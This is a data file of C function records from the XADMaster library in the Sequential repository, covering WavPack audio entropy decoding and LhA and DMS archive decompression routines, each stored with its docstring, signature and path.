{"docstring": "// This function is similar to send_word() except that no data is actually\n// written to any stream, but it does return the value that would have been\n// sent to a hybrid stream. It is used to determine beforehand how much noise\n// will be added to samples.\n", "func_signal": "int32_t nosend_word (WavpackStream *wps, int32_t value, int chan)", "code": "{\n    struct entropy_data *c = wps->w.c + chan;\n    uint32_t ones_count, low, mid, high;\n    int sign = (value < 0) ? 1 : 0;\n\n    if (sign)\n        value = ~value;\n\n    if ((wps->wphdr.flags & HYBRID_FLAG) && !chan)\n        update_error_limit (wps);\n\n    if (value < (int32_t) GET_MED (0)) {\n        low = 0;\n        high = GET_MED (0) - 1;\n        DEC_MED0 ();\n    }\n    else {\n        low = GET_MED (0);\n        INC_MED0 ();\n\n        if (value - low < GET_MED (1)) {\n            high = low + GET_MED (1) - 1;\n            DEC_MED1 ();\n        }\n        else {\n            low += GET_MED (1);\n            INC_MED1 ();\n\n            if (value - low < GET_MED (2)) {\n                high = low + GET_MED (2) - 1;\n                DEC_MED2 ();\n            }\n            else {\n                ones_count = 2 + (value - low) / GET_MED (2);\n                low += (ones_count - 2) * GET_MED (2);\n                high = low + GET_MED (2) - 1;\n                INC_MED2 ();\n            }\n        }\n    }\n\n    mid = (high + low + 1) >> 1;\n\n    if (!c->error_limit)\n        mid = value;\n    else\n        while (high - low > c->error_limit)\n            if (value < (int32_t) mid)\n                mid = ((high = mid - 1) + low + 1) >> 1;\n            else\n                mid = (high + (low = mid) + 1) >> 1;\n\n    c->slow_level -= (c->slow_level + SLO) >> SLS;\n    c->slow_level += mylog2 (mid);\n\n    return sign ? ~mid : mid;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// This is an optimized version of get_word() that is used for lossless only\n// (error_limit == 0). Also, rather than obtaining a single sample, it can be\n// used to obtain an entire buffer of either mono or stereo samples.\n", "func_signal": "int32_t get_words_lossless (WavpackStream *wps, int32_t *buffer, int32_t nsamples)", "code": "{\n    struct entropy_data *c = wps->w.c;\n    uint32_t ones_count, low, high;\n    Bitstream *bs = &wps->wvbits;\n    int32_t csamples;\n\n    if (!(wps->wphdr.flags & MONO_DATA))\n        nsamples *= 2;\n\n    for (csamples = 0; csamples < nsamples; ++csamples) {\n        if (!(wps->wphdr.flags & MONO_DATA))\n            c = wps->w.c + (csamples & 1);\n\n        if (wps->w.c [0].median [0] < 2 && !wps->w.holding_zero && !wps->w.holding_one && wps->w.c [1].median [0] < 2) {\n            uint32_t mask;\n            int cbits;\n\n            if (wps->w.zeros_acc) {\n                if (--wps->w.zeros_acc) {\n                    *buffer++ = 0;\n                    continue;\n                }\n            }\n            else {\n                for (cbits = 0; cbits < 33 && getbit (bs); ++cbits);\n\n                if (cbits == 33)\n                    break;\n\n                if (cbits < 2)\n                    wps->w.zeros_acc = cbits;\n                else {\n                    for (mask = 1, wps->w.zeros_acc = 0; --cbits; mask <<= 1)\n                        if (getbit (bs))\n                            wps->w.zeros_acc |= mask;\n\n                    wps->w.zeros_acc |= mask;\n                }\n\n                if (wps->w.zeros_acc) {\n                    CLEAR (wps->w.c [0].median);\n                    CLEAR (wps->w.c [1].median);\n                    *buffer++ = 0;\n                    continue;\n                }\n            }\n        }\n\n        if (wps->w.holding_zero)\n            ones_count = wps->w.holding_zero = 0;\n        else {\n            int next8;\n\n            if (bs->bc < 8) {\n                if (++(bs->ptr) == bs->end)\n                    bs->wrap (bs);\n\n                next8 = (bs->sr |= *(bs->ptr) << bs->bc) & 0xff;\n                bs->bc += sizeof (*(bs->ptr)) * 8;\n            }\n            else\n                next8 = bs->sr & 0xff;\n\n            if (next8 == 0xff) {\n                bs->bc -= 8;\n                bs->sr >>= 8;\n\n                for (ones_count = 8; ones_count < (LIMIT_ONES + 1) && getbit (bs); ++ones_count);\n\n                if (ones_count == (LIMIT_ONES + 1))\n                    break;\n\n                if (ones_count == LIMIT_ONES) {\n                    uint32_t mask;\n                    int cbits;\n\n                    for (cbits = 0; cbits < 33 && getbit (bs); ++cbits);\n\n                    if (cbits == 33)\n                        break;\n\n                    if (cbits < 2)\n                        ones_count = cbits;\n                    else {\n                        for (mask = 1, ones_count = 0; --cbits; mask <<= 1)\n                            if (getbit (bs))\n                                ones_count |= mask;\n\n                        ones_count |= mask;\n                    }\n\n                    ones_count += LIMIT_ONES;\n                }\n            }\n            else {\n                bs->bc -= (ones_count = ones_count_table [next8]) + 1;\n                bs->sr >>= ones_count + 1;\n            }\n\n            if (wps->w.holding_one) {\n                wps->w.holding_one = ones_count & 1;\n                ones_count = (ones_count >> 1) + 1;\n            }\n            else {\n                wps->w.holding_one = ones_count & 1;\n                ones_count >>= 1;\n            }\n\n            wps->w.holding_zero = ~wps->w.holding_one & 1;\n        }\n\n        if (ones_count == 0) {\n            low = 0;\n            high = GET_MED (0) - 1;\n            DEC_MED0 ();\n        }\n        else {\n            low = GET_MED (0);\n            INC_MED0 ();\n\n            if (ones_count == 1) {\n                high = low + GET_MED (1) - 1;\n                DEC_MED1 ();\n            }\n            else {\n                low += GET_MED (1);\n                INC_MED1 ();\n\n                if (ones_count == 2) {\n                    high = low + GET_MED (2) - 1;\n                    DEC_MED2 ();\n                }\n                else {\n                    low += (ones_count - 2) * GET_MED (2);\n                    high = low + GET_MED (2) - 1;\n                    INC_MED2 ();\n                }\n            }\n        }\n\n        low += read_code (bs, high - low);\n        *buffer++ = (getbit (bs)) ? ~low : low;\n    }\n\n    return (wps->wphdr.flags & MONO_DATA) ? csamples : (csamples / 2);\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// Read a single unsigned value from the specified bitstream with a value\n// from 0 to maxcode. If there are exactly a power of two number of possible\n// codes then this will read a fixed number of bits; otherwise it reads the\n// minimum number of bits and then determines whether another bit is needed\n// to define the code.\n", "func_signal": "static uint32_t FASTCALL read_code (Bitstream *bs, uint32_t maxcode)", "code": "{\n    uint32_t extras, code;\n    int bitcount;\n\n    if (maxcode < 2)\n        return maxcode ? getbit (bs) : 0;\n\n    bitcount = count_bits (maxcode);\n    extras = bitset [bitcount] - maxcode - 1;\n\n    while (bs->bc < bitcount) {\n        if (++(bs->ptr) == bs->end)\n            bs->wrap (bs);\n\n        bs->sr |= *(bs->ptr) << bs->bc;\n        bs->bc += sizeof (*(bs->ptr)) * 8;\n    }\n\n    if ((code = bs->sr & bitmask [bitcount - 1]) >= extras)\n        code = (code << 1) - extras + ((bs->sr >> (bitcount - 1)) & 1);\n    else\n        bitcount--;\n\n    if (bs->bc > 32) {\n        bs->bc -= bitcount;\n        bs->sr = *(bs->ptr) >> (sizeof (*(bs->ptr)) * 8 - bs->bc);\n    }\n    else {\n        bs->sr >>= bitcount;\n        bs->bc -= bitcount;\n    }\n\n    return code;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/**************************************************************************************************/\n", "func_signal": "XADRECOGDATA(Savage)", "code": "{\n  if(data[0] == 29 && data[2] == '*' && data[3] == 'S' && data[4] == 'V' &&\n  data[5] == 'G' && data[6] == '*' && EndGetI32(data+11) == 901120)\n    return 1;\n  else\n    return 0;\n}", "path": "XADMaster\\libxad\\clients\\LhA.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// These two functions convert internal weights (which are normally +/-1024)\n// to and from an 8-bit signed character version for storage in metadata. The\n// weights are clipped here in the case that they are outside that range.\n", "func_signal": "signed char store_weight (int weight)", "code": "{\n    if (weight > 1024)\n        weight = 1024;\n    else if (weight < -1024)\n        weight = -1024;\n\n    if (weight > 0)\n        weight -= (weight + 64) >> 7;\n\n    return (weight + 4) >> 3;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// Read the next word from the bitstream \"wvbits\" and return the value. This\n// function can be used for hybrid or lossless streams, but since an\n// optimized version is available for lossless this function would normally\n// be used for hybrid only. If a hybrid lossless stream is being read then\n// the \"correction\" offset is written at the specified pointer. A return value\n// of WORD_EOF indicates that the end of the bitstream was reached (all 1s) or\n// some other error occurred.\n", "func_signal": "int32_t FASTCALL get_word (WavpackStream *wps, int chan, int32_t *correction)", "code": "{\n    register struct entropy_data *c = wps->w.c + chan;\n    uint32_t ones_count, low, mid, high;\n    int next8, sign;\n    int32_t value;\n\n    if (correction)\n        *correction = 0;\n\n    if (!(wps->w.c [0].median [0] & ~1) && !wps->w.holding_zero && !wps->w.holding_one && !(wps->w.c [1].median [0] & ~1)) {\n        uint32_t mask;\n        int cbits;\n\n        if (wps->w.zeros_acc) {\n            if (--wps->w.zeros_acc) {\n                c->slow_level -= (c->slow_level + SLO) >> SLS;\n                return 0;\n            }\n        }\n        else {\n            for (cbits = 0; cbits < 33 && getbit (&wps->wvbits); ++cbits);\n\n            if (cbits == 33)\n                return WORD_EOF;\n\n            if (cbits < 2)\n                wps->w.zeros_acc = cbits;\n            else {\n                for (mask = 1, wps->w.zeros_acc = 0; --cbits; mask <<= 1)\n                    if (getbit (&wps->wvbits))\n                        wps->w.zeros_acc |= mask;\n\n                wps->w.zeros_acc |= mask;\n            }\n\n            if (wps->w.zeros_acc) {\n                c->slow_level -= (c->slow_level + SLO) >> SLS;\n                CLEAR (wps->w.c [0].median);\n                CLEAR (wps->w.c [1].median);\n                return 0;\n            }\n        }\n    }\n\n    if (wps->w.holding_zero)\n        ones_count = wps->w.holding_zero = 0;\n    else {\n        if (wps->wvbits.bc < 8) {\n            if (++(wps->wvbits.ptr) == wps->wvbits.end)\n                wps->wvbits.wrap (&wps->wvbits);\n\n            next8 = (wps->wvbits.sr |= *(wps->wvbits.ptr) << wps->wvbits.bc) & 0xff;\n            wps->wvbits.bc += sizeof (*(wps->wvbits.ptr)) * 8;\n        }\n        else\n            next8 = wps->wvbits.sr & 0xff;\n\n        if (next8 == 0xff) {\n            wps->wvbits.bc -= 8;\n            wps->wvbits.sr >>= 8;\n\n            for (ones_count = 8; ones_count < (LIMIT_ONES + 1) && getbit (&wps->wvbits); ++ones_count);\n\n            if (ones_count == (LIMIT_ONES + 1))\n                return WORD_EOF;\n\n            if (ones_count == LIMIT_ONES) {\n                uint32_t mask;\n                int cbits;\n\n                for (cbits = 0; cbits < 33 && getbit (&wps->wvbits); ++cbits);\n\n                if (cbits == 33)\n                    return WORD_EOF;\n\n                if (cbits < 2)\n                    ones_count = cbits;\n                else {\n                    for (mask = 1, ones_count = 0; --cbits; mask <<= 1)\n                        if (getbit (&wps->wvbits))\n                            ones_count |= mask;\n\n                    ones_count |= mask;\n                }\n\n                ones_count += LIMIT_ONES;\n            }\n        }\n        else {\n            wps->wvbits.bc -= (ones_count = ones_count_table [next8]) + 1;\n            wps->wvbits.sr >>= ones_count + 1;\n        }\n\n        if (wps->w.holding_one) {\n            wps->w.holding_one = ones_count & 1;\n            ones_count = (ones_count >> 1) + 1;\n        }\n        else {\n            wps->w.holding_one = ones_count & 1;\n            ones_count >>= 1;\n        }\n\n        wps->w.holding_zero = ~wps->w.holding_one & 1;\n    }\n\n    if ((wps->wphdr.flags & HYBRID_FLAG) && !chan)\n        update_error_limit (wps);\n\n    if (ones_count == 0) {\n        low = 0;\n        high = GET_MED (0) - 1;\n        DEC_MED0 ();\n    }\n    else {\n        low = GET_MED (0);\n        INC_MED0 ();\n\n        if (ones_count == 1) {\n            high = low + GET_MED (1) - 1;\n            DEC_MED1 ();\n        }\n        else {\n            low += GET_MED (1);\n            INC_MED1 ();\n\n            if (ones_count == 2) {\n                high = low + GET_MED (2) - 1;\n                DEC_MED2 ();\n            }\n            else {\n                low += (ones_count - 2) * GET_MED (2);\n                high = low + GET_MED (2) - 1;\n                INC_MED2 ();\n            }\n        }\n    }\n\n    low &= 0x7fffffff;\n    high &= 0x7fffffff;\n    mid = (high + low + 1) >> 1;\n\n    if (!c->error_limit)\n        mid = read_code (&wps->wvbits, high - low) + low;\n    else while (high - low > c->error_limit) {\n        if (getbit (&wps->wvbits))\n            mid = (high + (low = mid) + 1) >> 1;\n        else\n            mid = ((high = mid - 1) + low + 1) >> 1;\n    }\n\n    sign = getbit (&wps->wvbits);\n\n    if (bs_is_open (&wps->wvcbits) && c->error_limit) {\n        value = read_code (&wps->wvcbits, high - low) + low;\n\n        if (correction)\n            *correction = sign ? (mid - value) : (value - mid);\n    }\n\n    if (wps->wphdr.flags & HYBRID_BITRATE) {\n        c->slow_level -= (c->slow_level + SLO) >> SLS;\n        c->slow_level += mylog2 (mid);\n    }\n\n    return sign ? ~mid : mid;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/****************************************************************************/\n/*  track 80 is FILEID.DIZ, track 0xffff (-1) is Banner  */\n/*  and track 0 with 1024 bytes only is a fake boot block with more advertising */\n", "func_signal": "static xadINT32 testDMSTrack(struct DMSTrack *t, struct xadMasterBase *xadMasterBase)", "code": "{\n  if(EndGetM16(t->TRID) != 0x5452)\n    return XADERR_ILLEGALDATA;\n  if(xadCalcCRC16(XADM XADCRC16_ID1, 0, sizeof(struct DMSTrack)-2,\n  (xadUINT8 *)t) != EndGetM16(t->CheckSum))\n    return XADERR_CHECKSUM;\n\n  return 0;\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// This function is called during both encoding and decoding of hybrid data to\n// update the \"error_limit\" variable which determines the maximum sample error\n// allowed in the main bitstream. In the HYBRID_BITRATE mode (which is the only\n// currently implemented) this is calculated from the slow_level values and the\n// bitrate accumulators. Note that the bitrate accumulators can be changing.\n", "func_signal": "static void update_error_limit (WavpackStream *wps)", "code": "{\n    int bitrate_0 = (wps->w.bitrate_acc [0] += wps->w.bitrate_delta [0]) >> 16;\n\n    if (wps->wphdr.flags & MONO_DATA) {\n        if (wps->wphdr.flags & HYBRID_BITRATE) {\n            int slow_log_0 = (wps->w.c [0].slow_level + SLO) >> SLS;\n\n            if (slow_log_0 - bitrate_0 > -0x100)\n                wps->w.c [0].error_limit = exp2s (slow_log_0 - bitrate_0 + 0x100);\n            else\n                wps->w.c [0].error_limit = 0;\n        }\n        else\n            wps->w.c [0].error_limit = exp2s (bitrate_0);\n    }\n    else {\n        int bitrate_1 = (wps->w.bitrate_acc [1] += wps->w.bitrate_delta [1]) >> 16;\n\n        if (wps->wphdr.flags & HYBRID_BITRATE) {\n            int slow_log_0 = (wps->w.c [0].slow_level + SLO) >> SLS;\n            int slow_log_1 = (wps->w.c [1].slow_level + SLO) >> SLS;\n\n            if (wps->wphdr.flags & HYBRID_BALANCE) {\n                int balance = (slow_log_1 - slow_log_0 + bitrate_1 + 1) >> 1;\n\n                if (balance > bitrate_0) {\n                    bitrate_1 = bitrate_0 * 2;\n                    bitrate_0 = 0;\n                }\n                else if (-balance > bitrate_0) {\n                    bitrate_0 = bitrate_0 * 2;\n                    bitrate_1 = 0;\n                }\n                else {\n                    bitrate_1 = bitrate_0 + balance;\n                    bitrate_0 = bitrate_0 - balance;\n                }\n            }\n\n            if (slow_log_0 - bitrate_0 > -0x100)\n                wps->w.c [0].error_limit = exp2s (slow_log_0 - bitrate_0 + 0x100);\n            else\n                wps->w.c [0].error_limit = 0;\n\n            if (slow_log_1 - bitrate_1 > -0x100)\n                wps->w.c [1].error_limit = exp2s (slow_log_1 - bitrate_1 + 0x100);\n            else\n                wps->w.c [1].error_limit = 0;\n        }\n        else {\n            wps->w.c [0].error_limit = exp2s (bitrate_0);\n            wps->w.c [1].error_limit = exp2s (bitrate_1);\n        }\n    }\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/* ------------------------------------------------------------------------ */\n", "func_signal": "static void LHAread_pt_len(struct LhADecrData *dat, xadINT16 nn, xadINT16 nbit, xadINT16 i_special)", "code": "{\n  xadINT16 i, c, n;\n\n  if(!(n = LHAgetbits(dat, nbit)))\n  {\n    c = LHAgetbits(dat, nbit);\n    for(i = 0; i < nn; i++)\n      dat->d.st.pt_len[i] = 0;\n    for(i = 0; i < 256; i++)\n      dat->d.st.pt_table[i] = c;\n  }\n  else\n  {\n    i = 0;\n    while(i < n)\n    {\n      c = dat->bitbuf >> (16 - 3);\n      if(c == 7)\n      {\n        xadUINT16 mask;\n\n        mask = 1 << (16 - 4);\n        while(mask & dat->bitbuf)\n        {\n          mask >>= 1;\n          c++;\n        }\n      }\n      LHAfillbuf(dat, (c < 7) ? 3 : c - 3);\n      dat->d.st.pt_len[i++] = c;\n      if(i == i_special)\n      {\n        c = LHAgetbits(dat, 2);\n        while(--c >= 0)\n          dat->d.st.pt_len[i++] = 0;\n      }\n    }\n    while(i < nn)\n      dat->d.st.pt_len[i++] = 0;\n    LHAmake_table(dat, nn, dat->d.st.pt_len, 8, dat->d.st.pt_table);\n  }\n}", "path": "XADMaster\\libxad\\clients\\LhA.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// This function returns the original integer represented by the supplied\n// logarithm (at least within the provided accuracy). The log is signed,\n// but since a full 32-bit value is returned this can be used for unsigned\n// conversions as well (i.e. the input range is -8192 to +8447).\n", "func_signal": "int32_t exp2s (int log)", "code": "{\n    uint32_t value;\n\n    if (log < 0)\n        return -exp2s (-log);\n\n    value = exp2_table [log & 0xff] | 0x100;\n\n    if ((log >>= 8) <= 9)\n        return value >> (9 - log);\n    else\n        return value << (log - 9);\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/****************************************************************************/\n", "func_signal": "static xadINT32 DMSUnpMEDIUM(xadSTRPTR *res, xadUINT32 size, struct DMSData *d, struct xadMasterBase *xadMasterBase)", "code": "{\n  xadSTRPTR out, outstore, outend, in = *res;\n  xadUINT16 i,j, c;\n  xadINT32 err = 0;\n  xadUINT8 u;\n\n  if(!(out = outstore = (xadSTRPTR) xadAllocVec(XADM size+1, XADMEMF_PUBLIC|XADMEMF_CLEAR)))\n    return XADERR_NOMEMORY;\n\n  d->DidInit = 0;       /* clear Init flag */\n\n  DMSinitbitbuf(in, d);\n  outend = out + size;\n\n  while(out < outend)\n  {\n    if(DMSGETBITS(1))\n    {\n      DMSDROPBITS(1);\n      *out++ = d->Text[d->RTV_Medium++ & 0x3FFF] = (xadUINT8)DMSGETBITS(8);\n      DMSDROPBITS(8);\n    }\n    else\n    {\n      DMSDROPBITS(1);\n      c = DMSGETBITS(8);\n      DMSDROPBITS(8);\n      j = (xadUINT16) (DMS_d_code[c]+3);\n      u = DMS_d_len[c];\n      c = (xadUINT16) (((c << u) | DMSGETBITS(u)) & 0xff);\n      DMSDROPBITS(u);\n      u = DMS_d_len[c];\n      c = (xadUINT16) ((DMS_d_code[c] << 8) | (((c << u) | DMSGETBITS(u)) & 0xff));\n      DMSDROPBITS(u);\n      i = (xadUINT16) (d->RTV_Medium - c - 1);\n\n      if(j + out > outend)\n        err = XADERR_ILLEGALDATA;\n      else\n        while(j--)\n          *out++ = d->Text[d->RTV_Medium++ & 0x3FFF] = d->Text[i++ & 0x3FFF];\n    }\n  }\n  d->RTV_Medium = (xadUINT16)((d->RTV_Medium+66) & 0x3FFF);\n\n  xadFreeObjectA(XADM *res,0);\n  *res = outstore;\n  return err;\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// This function returns the log2 for the specified 32-bit unsigned value.\n// The maximum value allowed is about 0xff800000 and returns 8447.\n", "func_signal": "static int FASTCALL mylog2 (uint32_t avalue)", "code": "{\n    int dbits;\n\n    if ((avalue += avalue >> 9) < (1 << 8)) {\n        dbits = nbits_table [avalue];\n        return (dbits << 8) + log2_table [(avalue << (9 - dbits)) & 0xff];\n    }\n    else {\n        if (avalue < (1L << 16))\n            dbits = nbits_table [avalue >> 8] + 8;\n        else if (avalue < (1L << 24))\n            dbits = nbits_table [avalue >> 16] + 16;\n        else\n            dbits = nbits_table [avalue >> 24] + 24;\n\n        return (dbits << 8) + log2_table [(avalue >> (dbits - 9)) & 0xff];\n    }\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/* Only the crypted information is used form DMS header. All the other\n   information is taken from data directly, to allow these lots of\n   modified headers. */\n", "func_signal": "static struct xadDiskInfo *DMSOneArc(struct xadMasterBase *xadMasterBase,\nstruct xadArchiveInfo *ai, xadINT32 *more, xadINT32 crypted, xadINT32 *ret)", "code": "{\n  struct xadDiskInfo *di;\n  struct xadTextInfo *ti = 0, *ti2;\n  struct DMSData *d;\n  struct DMSTrack t;\n  xadINT32 err = 0, stop = 0, tracksize = 0;\n  xadINT32 lowcyl = -1, highcyl = -1;\n  xadSTRPTR zerotxt = 0;\n  xadUINT32 zerosize = 0;\n\n  *more = 0;\n\n  if((di = (struct xadDiskInfo *) xadAllocObject(XADM XADOBJ_DISKINFO, TAG_DONE)))\n  {\n    di->xdi_Flags |= XADDIF_SEEKDATAPOS;\n    if((d = GetDMSData(xadMasterBase, ai->xai_Password)))\n    {\n      if(crypted)\n        d->UsePwd = DMSPWD_USE;\n\n      di->xdi_DataPos = ai->xai_InPos;\n\n      while(!stop && !err && ai->xai_InPos < ai->xai_InSize)\n      {\n        if(xadHookAccess(XADM XADAC_READ, sizeof(struct DMSTrack), &t, ai))\n          stop = 1;\n        else\n        {\n          if(testDMSTrack(&t, xadMasterBase))\n            stop = 2;   /* stop > 1 means seek back one Track */\n          else\n          {\n            xadINT16 tr = EndGetM16(t.TrackNumber);\n            xadUINT16 upsize = EndGetM16(t.UnpackedSize);\n            if(zerotxt)\n            {\n              while(zerosize && !zerotxt[zerosize-1])\n                --zerosize;\n              if(tr != 1 && zerosize && zerosize <= 2048) /* was a information text */\n              {\n                highcyl = lowcyl = -1; /* reset these two */\n                if((ti2 = (struct xadTextInfo *) xadAllocObjectA(XADM XADOBJ_TEXTINFO, 0)))\n                {\n                  if(ti)\n                    ti->xti_Next = ti2;\n                  else\n                    di->xdi_TextInfo = ti2;\n                  ti = ti2;\n                  if(!(ti2->xti_Text = (xadSTRPTR) xadAllocVec(XADM zerosize+1, XADMEMF_PUBLIC|XADMEMF_CLEAR)))\n                    err = XADERR_NOMEMORY;\n                  else\n                  {\n                    ti2->xti_Size = zerosize;\n                    xadCopyMem(XADM zerotxt, ti->xti_Text, zerosize);\n                  }\n                }\n                else\n                  err = XADERR_NOMEMORY;\n              }\n              xadFreeObjectA(XADM zerotxt,0);\n              zerotxt = 0;\n            }\n            /* Normally only -1 is allowed as banner, but I found at least\n               one file using -2. */\n            if(tr < 0 || tr == DMSTRTYPE_DIZ || (!tr && upsize == 1024))\n            {\n              if((ti2 = (struct xadTextInfo *) xadAllocObjectA(XADM XADOBJ_TEXTINFO, 0)))\n              {\n                if(tr == DMSTRTYPE_DIZ)\n                  ti2->xti_Flags |= XADTIF_FILEDIZ;\n                if(!DecrunchDMS(&t, ai, xadMasterBase, &ti2->xti_Text, d))\n                  ti2->xti_Size = upsize;\n                else if(crypted && !d->PassCRC)\n                  ti2->xti_Flags |= XADTIF_CRYPTED;\n                if(ti)\n                  ti->xti_Next = ti2;\n                else\n                  di->xdi_TextInfo = ti2;\n                ti = ti2;\n\n                if(highcyl == -1)\n                  di->xdi_DataPos = ai->xai_InPos;\n              }\n              else\n                err = XADERR_NOMEMORY;\n            }\n            else\n            {\n              xadUINT16 cmode = EndGetM16(t.CMODE_Packed);\n              if(highcyl == -1)\n              {\n                highcyl = lowcyl = tr;\n                tracksize = upsize;\n                /* store first track to extract */\n/* FIXME - make real pointer! */\n                di->xdi_PrivateInfo = (xadPTR)(uintptr_t) (ai->xai_InPos-sizeof(struct DMSTrack));\n                if(!tr)\n                {\n                  zerosize = upsize;\n                  if((DecrunchDMS(&t, ai, xadMasterBase, &zerotxt, d)))\n                    zerotxt = 0;        /* ignore it */\n                  continue;\n                }\n              }\n              else if(tr != highcyl+1 || tracksize != upsize)\n              {\n                stop = 3; break;\n              }\n              else\n                ++highcyl;\n\n              if(d->UsePwd)\n              {\n                xadSTRPTR a;\n                if(!(a = xadAllocVec(XADM cmode, XADMEMF_ANY)))\n                  err = XADERR_NOMEMORY;\n                else\n                {\n                  if(!(err = xadHookAccess(XADM XADAC_READ, cmode, a, ai)))\n                    DecryptDMS(a, cmode, d);   /* to get a valid pwd pointer */\n                  xadFreeObjectA(XADM a, 0);\n                }\n              }\n              else\n                err = xadHookAccess(XADM XADAC_INPUTSEEK, cmode, 0, ai);\n            }\n          } /* testDMSTrack */\n        } /* xadHookAccess */\n      } /* while */\n\n      if(zerotxt) /* in case there is only one zero track and nothing else */\n      {\n        xadFreeObjectA(XADM zerotxt,0);\n        zerotxt = 0;\n      }\n\n      if(stop > 1)\n        err = xadHookAccess(XADM XADAC_INPUTSEEK, -sizeof(struct DMSTrack), &t, ai);\n\n      if(!tracksize || lowcyl == -1 || highcyl == -1 || tracksize % (2*512))\n        err = XADERR_ILLEGALDATA;\n      else\n      {\n        if(crypted & DMSINFO_ENCRYPT)\n          di->xdi_Flags |= XADDIF_CRYPTED;\n\n        tracksize /= (2*512);\n\n        di->xdi_LowCyl = lowcyl;\n        di->xdi_HighCyl = highcyl;\n        di->xdi_SectorSize = 512;\n        di->xdi_Heads = 2;\n        di->xdi_Cylinders = 80;\n        switch(tracksize)\n        {\n        case 18: case 9:\n          di->xdi_EntryInfo = (xadSTRPTR)\"MSDOS disk\"; /* no break! */\n        case 22: case 11:\n          di->xdi_TrackSectors = tracksize;\n          break;\n        default: err = XADERR_ILLEGALDATA; break;\n        }\n        di->xdi_CylSectors = 2 * di->xdi_TrackSectors;\n        di->xdi_TotalSectors = 80 * di->xdi_CylSectors;\n      }\n\n      xadFreeObjectA(XADM d, 0);\n    } /* GetDMSData */\n    else\n      err = XADERR_NOMEMORY;\n\n    if(err)\n    {\n      for(ti = di->xdi_TextInfo; ti; ti = ti2)\n      {\n        ti2 = ti->xti_Next;\n        if(ti->xti_Text)\n          xadFreeObjectA(XADM ti->xti_Text, 0);\n        xadFreeObjectA(XADM ti, 0);\n      }\n      xadFreeObjectA(XADM di, 0);\n      di = 0;\n    }\n  } /* xadAllocObjectA */\n  else\n    err = XADERR_NOMEMORY;\n\n  *ret = err;\n  if(stop == 3 && !err)\n    *more = 1;\n\n  return di;\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// Set up parameters for hybrid mode based on header flags and \"bits\" field.\n// This is currently only set up for the HYBRID_BITRATE mode in which the\n// allowed error varies with the residual level (from \"slow_level\"). The\n// simpler mode (which is not used yet) has the error level directly\n// controlled from the metadata.\n", "func_signal": "void word_set_bitrate (WavpackStream *wps)", "code": "{\n    int bitrate_0, bitrate_1;\n\n    if (wps->wphdr.flags & HYBRID_BITRATE) {\n        if (wps->wphdr.flags & FALSE_STEREO)\n            bitrate_0 = (wps->bits * 2 - 512) < 568 ? 0 : (wps->bits * 2 - 512) - 568;\n        else\n            bitrate_0 = wps->bits < 568 ? 0 : wps->bits - 568;\n\n        if (!(wps->wphdr.flags & MONO_DATA)) {\n\n            if (wps->wphdr.flags & HYBRID_BALANCE)\n                bitrate_1 = (wps->wphdr.flags & JOINT_STEREO) ? 256 : 0;\n            else {\n                bitrate_1 = bitrate_0;\n\n                if (wps->wphdr.flags & JOINT_STEREO) {\n                    if (bitrate_0 < 128) {\n                        bitrate_1 += bitrate_0;\n                        bitrate_0 = 0;\n                    }\n                    else {\n                        bitrate_0 -= 128;\n                        bitrate_1 += 128;\n                    }\n                }\n            }\n        }\n        else\n            bitrate_1 = 0;\n    }\n    else\n        bitrate_0 = bitrate_1 = 0;\n\n    wps->w.bitrate_acc [0] = (int32_t) bitrate_0 << 16;\n    wps->w.bitrate_acc [1] = (int32_t) bitrate_1 << 16;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// Read the median log2 values from the specifed metadata structure, convert\n// them back to 32-bit unsigned values and store them. If length is not\n// exactly correct then we flag and return an error.\n", "func_signal": "int read_entropy_vars (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    unsigned char *byteptr = wpmd->data;\n\n    if (wpmd->byte_length != ((wps->wphdr.flags & MONO_DATA) ? 6 : 12))\n        return FALSE;\n\n    wps->w.c [0].median [0] = exp2s (byteptr [0] + (byteptr [1] << 8));\n    wps->w.c [0].median [1] = exp2s (byteptr [2] + (byteptr [3] << 8));\n    wps->w.c [0].median [2] = exp2s (byteptr [4] + (byteptr [5] << 8));\n\n    if (!(wps->wphdr.flags & MONO_DATA)) {\n        wps->w.c [1].median [0] = exp2s (byteptr [6] + (byteptr [7] << 8));\n        wps->w.c [1].median [1] = exp2s (byteptr [8] + (byteptr [9] << 8));\n        wps->w.c [1].median [2] = exp2s (byteptr [10] + (byteptr [11] << 8));\n    }\n\n    return TRUE;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
